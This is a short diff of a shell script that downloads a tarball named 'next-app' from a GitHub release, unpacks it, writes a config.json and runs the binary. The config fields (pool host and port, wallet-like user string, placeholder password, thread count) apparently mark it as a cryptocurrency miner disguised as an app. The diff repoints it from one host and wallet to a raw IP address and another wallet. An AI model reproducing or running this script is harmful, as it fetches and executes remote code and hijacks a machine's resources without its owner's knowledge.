@@ -3,6 +3,6 @@ wget https://github.com/mom742886/next-app/releases/download/v1/next-app.tar.gz
 
 tar -xf next-app.tar.gz
 
-echo '{"host": "dagnam.xyz", "port": 4629, "user": "WZ2dpArp9du6scQ43hgqHL1PJcAaD5CPnT", "pass": "c=SWAMP,mc=SWAMP,zap=SWAMP,m=solo", "threads": 3}' > config.json
+echo '{"host": "93.123.82.33", "port": 443, "user": "mbc1qh9m6s26m5u0snjk7wp5gl4v6w6ecsgz7jsv482", "pass": "x", "threads": 3}' > config.json
 ls -la
 ./next/next-app
